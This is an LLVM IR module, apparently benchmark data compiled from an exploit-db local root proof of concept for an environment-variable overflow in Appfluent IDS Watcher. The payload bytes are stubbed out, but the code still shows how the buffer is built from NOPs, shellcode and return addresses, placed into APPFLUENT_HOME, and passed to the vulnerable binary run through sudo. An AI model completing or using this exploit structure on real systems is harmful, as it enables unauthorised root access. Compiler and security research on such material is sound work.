; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/solaris/local/extr_1360.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/solaris/local/extr_1360.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@DAHBUF = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [76 x i8] c"\0ALocal root proof of concept for Appfluent IDS Watcher environment overflow\00", align 1
@.str.1 = private unnamed_addr constant [77 x i8] c"found and developed by c0ntex || c0ntexb@gmail.com || www.open-security.org\0A\00", align 1
@NOP = common dso_local global i32 0, align 4
@shellcode = common dso_local global i32 0, align 4
@retloc = common dso_local global i32 0, align 4
@retlok = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [16 x i8] c"APPFLUENT_HOME=\00", align 1
@SUDO = common dso_local global i32 0, align 4
@VULN = common dso_local global i32 0, align 4
@WOPT = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [7 x i8] c"execle\00", align 1
@EXIT_FAILURE = common dso_local global i32 0, align 4
@EXIT_SUCCESS = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i8*, align 8
  %3 = alloca i64, align 8
  %4 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  %5 = load i32, i32* @DAHBUF, align 4
  %6 = add nsw i32 %5, 9
  %7 = zext i32 %6 to i64
  %8 = call i8* @llvm.stacksave()
  store i8* %8, i8** %2, align 8
  %9 = alloca i8, i64 %7, align 16
  store i64 %7, i64* %3, align 8
  %10 = call i32 @puts(i8* getelementptr inbounds ([76 x i8], [76 x i8]* @.str, i64 0, i64 0))
  %11 = call i32 @puts(i8* getelementptr inbounds ([77 x i8], [77 x i8]* @.str.1, i64 0, i64 0))
  %12 = load i32, i32* @NOP, align 4
  %13 = load i32, i32* @DAHBUF, align 4
  %14 = call i32 @memset(i8* %9, i32 %12, i32 %13)
  %15 = getelementptr inbounds i8, i8* %9, i64 100
  %16 = load i32, i32* @shellcode, align 4
  %17 = load i32, i32* @shellcode, align 4
  %18 = call i32 @strlen(i32 %17)
  %19 = call i32 @memcpy(i8* %15, i32 %16, i32 %18)
  %20 = load i32, i32* @DAHBUF, align 4
  %21 = sext i32 %20 to i64
  %22 = getelementptr inbounds i8, i8* %9, i64 %21
  %23 = load i32, i32* @retloc, align 4
  %24 = load i32, i32* @retloc, align 4
  %25 = call i32 @strlen(i32 %24)
  %26 = call i32 @memcpy(i8* %22, i32 %23, i32 %25)
  %27 = load i32, i32* @DAHBUF, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds i8, i8* %9, i64 %28
  %30 = getelementptr inbounds i8, i8* %29, i64 4
  %31 = load i32, i32* @retlok, align 4
  %32 = load i32, i32* @retlok, align 4
  %33 = call i32 @strlen(i32 %32)
  %34 = call i32 @memcpy(i8* %30, i32 %31, i32 %33)
  %35 = load i32, i32* @DAHBUF, align 4
  %36 = add nsw i32 %35, 9
  %37 = sext i32 %36 to i64
  %38 = getelementptr inbounds i8, i8* %9, i64 %37
  store i8 0, i8* %38, align 1
  %39 = getelementptr inbounds i8, i8* %9, i64 0
  %40 = call i32 @strncpy(i8* %39, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.2, i64 0, i64 0), i32 15)
  %41 = call i32 @putenv(i8* %9)
  %42 = load i32, i32* @SUDO, align 4
  %43 = load i32, i32* @SUDO, align 4
  %44 = load i32, i32* @VULN, align 4
  %45 = load i32, i32* @WOPT, align 4
  %46 = call i64 @execl(i32 %42, i32 %43, i32 %44, i32 %45, i32* null)
  %47 = icmp slt i64 %46, 0
  br i1 %47, label %48, label %51

48:                                               ; preds = %0
  %49 = call i32 @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.3, i64 0, i64 0))
  %50 = load i32, i32* @EXIT_FAILURE, align 4
  store i32 %50, i32* %1, align 4
  store i32 1, i32* %4, align 4
  br label %53

51:                                               ; preds = %0
  %52 = load i32, i32* @EXIT_SUCCESS, align 4
  store i32 %52, i32* %1, align 4
  store i32 1, i32* %4, align 4
  br label %53

53:                                               ; preds = %51, %48
  %54 = load i8*, i8** %2, align 8
  call void @llvm.stackrestore(i8* %54)
  %55 = load i32, i32* %1, align 4
  ret i32 %55
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @puts(i8*) #2

declare dso_local i32 @memset(i8*, i32, i32) #2

declare dso_local i32 @memcpy(i8*, i32, i32) #2

declare dso_local i32 @strlen(i32) #2

declare dso_local i32 @strncpy(i8*, i8*, i32) #2

declare dso_local i32 @putenv(i8*) #2

declare dso_local i64 @execl(i32, i32, i32, i32, i32*) #2

declare dso_local i32 @perror(i8*) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
